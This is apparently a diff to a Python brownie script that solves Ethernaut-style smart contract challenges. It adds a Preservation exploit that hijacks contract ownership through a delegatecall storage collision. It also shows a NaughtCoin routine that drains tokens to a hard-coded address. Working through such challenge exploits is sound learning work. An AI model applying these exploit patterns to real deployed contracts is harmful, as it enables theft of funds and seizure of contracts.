@@ -7,7 +7,7 @@ import time
 from web3.auto.infura import w3
 import os
 from brownie import Wei, AttackPrivacy, GatekeeperOne, AttackGatekeeperOne, GatekeeperTwo, AttackGatekeeperTwo
-from brownie import NaughtCoin
+from brownie import NaughtCoin, Preservation, AttackPreservation
 
 
 
@@ -268,7 +268,7 @@ def naughtcoin():
         print(f"Victim balance: {naughtcoin.balanceOf(account.address)}")
         print(f"Attacker balance: {naughtcoin.balanceOf(accounts[1].address)}")
     else:
-        # we'll just drain the contract into a random wallet
+        # we'll just drain the contract into a random wallet from etherscan
         randomAddress = '0x7ffC57839B00206D1ad20c69A1981b489f772031'
         print(f"Balance: {naughtcoin.balanceOf(account.address)}")
         naughtcoin.approve(account.address, naughtcoin.balanceOf(account.address), {"from":account.address}).wait(1)
@@ -277,7 +277,24 @@ def naughtcoin():
         print(f"After attack...Balance: {naughtcoin.balanceOf(account.address)}")
 
 
-    
+def preservation():
+    if network.show_active() in LOCAL_BLOCKCHAIN_ENVIRONMENTS:
+        print("This test is for fork/testnet use only. I don't feel like deploying manually.")
+        return
+
+    account = get_account()
+
+    attacker = AttackPreservation.deploy({"from":account.address}, publish_source=False)
+    preservation = deploy_contract(Preservation, "Preservation", 1, [])
+    print(f"Owner: {preservation.owner()}")
+
+    # the first setFirstTime call will set the attacker contract as the timezoneOne library
+    preservation.setFirstTime(attacker.address, {"from":account.address}).wait(1)
+
+    # the second setFirstTime call will call the attacker's setTime which will set the owner as msg.sender
+    preservation.setFirstTime(attacker.address, {"from":account.address}).wait(1)
+    print(f"After attack...Owner: {preservation.owner()}")
+
 
 
 
@@ -300,4 +317,5 @@ def main():
     #deploy_privacy()
     #deploy_gatekeeperone()
     #deploy_gatekeepertwo()
-    naughtcoin()
+    #naughtcoin()
+    preservation()
